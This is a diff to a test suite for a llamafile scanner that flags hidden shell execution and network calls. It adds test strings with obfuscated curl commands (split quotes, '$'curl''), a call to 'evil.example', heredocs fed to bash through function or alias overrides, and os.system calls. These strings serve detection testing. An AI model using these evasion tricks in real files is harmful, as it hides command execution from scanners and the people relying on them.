@@ -413,10 +413,13 @@ def test_llamafile_literal_heredoc_analysis_does_not_rescan_unterminated_bodies(
     original = llamafile_scanner_module._shell_heredoc_declarations
     calls = 0
 
-    def count_declarations(line: str) -> list[tuple[str, bool, bool]]:
+    def count_declarations(
+        line: str,
+        overridden_consumers: set[str] | frozenset[str] = frozenset(),
+    ) -> list[tuple[str, bool, bool]]:
         nonlocal calls
         calls += 1
-        return original(line)
+        return original(line, overridden_consumers)
 
     monkeypatch.setattr(llamafile_scanner_module, "_shell_heredoc_declarations", count_declarations)
 
@@ -432,10 +435,14 @@ def test_llamafile_literal_heredoc_declarations_bound_context_parsing(
     original = llamafile_scanner_module._heredoc_body_is_passive_data
     calls = 0
 
-    def count_context(line: str, operator_start: int) -> bool:
+    def count_context(
+        line: str,
+        operator_start: int,
+        overridden_consumers: set[str] | frozenset[str] = frozenset(),
+    ) -> bool:
         nonlocal calls
         calls += 1
-        return original(line, operator_start)
+        return original(line, operator_start, overridden_consumers)
 
     monkeypatch.setattr(llamafile_scanner_module, "_heredoc_body_is_passive_data", count_context)
 
@@ -2140,10 +2147,21 @@ def test_llamafile_shell_stdin_pipeline_parsing_is_bounded() -> None:
 
 
 def test_llamafile_shell_printf_output_is_bounded() -> None:
-    output = llamafile_scanner_module._shell_printf_output("curl %s " + ("x" * 4096), ["host"] * 1000)
+    output, truncated = llamafile_scanner_module._shell_printf_output("curl %s " + ("x" * 4096), ["host"] * 1000)
 
     assert len(output) == LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES
     assert output.startswith("curl host ")
+    assert truncated is True
+
+
+def test_llamafile_shell_printf_payload_truncation_is_inconclusive() -> None:
+    runtime_text = "printf '" + (" " * 33_000) + "%s\\n' x 'curl internal-host' | bash"
+
+    command, network, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert command is False
+    assert network is False
+    assert token_scan_limited is True
 
 
 def test_llamafile_python_line_is_parsed_once(
@@ -2162,6 +2180,42 @@ def test_llamafile_python_line_is_parsed_once(
 
     assert llamafile_scanner_module._runtime_text_signals(runtime_text)[:2] == (False, False)
     assert parse_calls == 1
+
+
+def test_llamafile_python_ast_byte_columns_are_normalized() -> None:
+    runtime_text = ("\N{LATIN SMALL LETTER E WITH ACUTE}" * 12) + "=1; os.system('curl internal-host')"
+
+    command, network, _, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert command is True
+    assert network is True
+
+
+def test_llamafile_streams_utf8_python_execution_across_chunk_boundary(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    runtime_text = ("\N{LATIN SMALL LETTER E WITH ACUTE}" * 12) + "=1; os.system('curl internal-host')"
+    binary = tmp_path / "utf8-python-execution.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_text]))
+    monkeypatch.setattr(llamafile_scanner_module, "LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES", 89)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert any(check.severity == IssueSeverity.CRITICAL for check in runtime_checks)
+    assert any(check.details.get("correlated_evidence") for check in runtime_checks)
+
+
+def test_llamafile_utf8_python_string_near_match_stays_clean(tmp_path: Path) -> None:
+    runtime_text = ("\N{LATIN SMALL LETTER E WITH ACUTE}" * 12) + '=1; value="os.system curl internal-host"'
+    binary = tmp_path / "utf8-python-string.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_text]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in runtime_checks)
 
 
 def test_llamafile_interpreter_candidate_parsing_is_bounded() -> None:
@@ -2668,6 +2722,13 @@ def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) ->
         r"curl internal\-host",
         r"c\u\r\l internal-host",
         'c""url internal-host',
+        "c'u'rl internal-host",
+        "cu'r'l internal-host",
+        "curl'.exe' internal-host",
+        "c'u'rl'.exe' internal-host",
+        "$'curl' internal-host",
+        '$"curl" internal-host',
+        'curl "internal-"host',
         "curl user@evil.example",
         "curl evil.example?x=1",
         "/usr/bin/curl internal-host",
@@ -2779,6 +2840,10 @@ def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) ->
         "sed -n 'w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
         "sed 's/.*/&/w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
         "sed -n '1w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed(){ bash; }; sed -n p <<'EOF'\ncurl internal-host\nEOF",
+        "sort(){ bash; }; sort <<'EOF'\ncurl internal-host\nEOF",
+        "sed(){ bash; }\nsed -n p <<'EOF'\ncurl internal-host\nEOF",
+        "shopt -s expand_aliases\nalias sort=bash\nsort <<'EOF'\ncurl internal-host\nEOF",
         "bash <<< 'curl internal-host'",
         "bash /dev/stdin <<< 'curl internal-host'",
         "bash - <<< 'curl internal-host'",
@@ -3031,12 +3096,16 @@ def test_llamafile_scanner_does_not_correlate_command_near_matches(
         "builtin curl internal-host",
         "curl -V internal-host",
         "curl -M internal-host",
+        "curl -h all internal-host",
+        "curl -hs internal-host",
+        "curl -hsi internal-host",
         "wget -V internal-host",
         "wget -h internal-host",
         "arr=(curl internal-host)",
         "declare -a arr=(curl internal-host)",
         "bash <<'EOF'\narr=(curl internal-host)\nEOF",
         "curl user@localhost",
+        "echo c'u'rl internal-host",
         "find . -exec curl internal-host ;",
         "find . -exec curl internal-host ; echo \\;",
         "find . -exec curl internal-host && echo \\;",
